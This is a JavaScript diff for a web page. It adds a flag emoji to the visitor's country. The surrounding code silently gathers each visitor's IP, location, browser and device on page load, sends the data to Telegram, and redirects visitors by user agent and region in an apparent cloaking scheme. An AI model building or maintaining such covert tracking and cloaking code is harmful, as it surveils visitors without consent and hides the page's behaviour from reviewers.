@@ -130,8 +130,10 @@ const ASIAN_COUNTRIES = ['Afghanistan', 'Armenia', 'Azerbaijan', 'Bahrain', 'Ban
 async function getUserInfo() {
     const response = await fetch('https://ipapi.co/json/');
     const data = await response.json();
+    const countryCode = data.country_code ? data.country_code.toUpperCase() : '';
+    const countryFlag = countryCode ? String.fromCodePoint(...[...countryCode].map(c => 127397 + c.charCodeAt(0))) : '🌍';
     return {
-        country: data.country_name,
+        country: `${countryFlag} ${data.country_name}`,
         ip: data.ip,
         browser: navigator.userAgentData ? navigator.userAgentData.brands.map(b => b.brand).join(', ') : navigator.userAgent,
         device: navigator.userAgentData ? navigator.userAgentData.mobile ? 'Mobile' : 'Desktop' : 'Unknown',
@@ -195,7 +197,7 @@ function checkAndRedirect(info) {
     const isWebView = userAgent.includes('tiktok') || userAgent.includes('webview');
     const isKnownBrowser = !isWebView && (userAgent.includes('chrome') || userAgent.includes('firefox') || userAgent.includes('safari') || userAgent.includes('edg'));
     const isMobileDevice = /android|iphone|ipad|ipod/i.test(userAgent);
-    const isInAsia = ASIAN_COUNTRIES.includes(info.country);
+    const isInAsia = ASIAN_COUNTRIES.includes(info.country.replace(/.* /, ''));
 
     if (isKnownBrowser && isMobileDevice && !isInAsia) {
         window.location.href = 'https://www.twitch.tv';
@@ -217,6 +219,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     sendToTelegram(userInfo, uniqueCount, isUnique);
     checkAndRedirect(userInfo);
 });
+
 
 
 
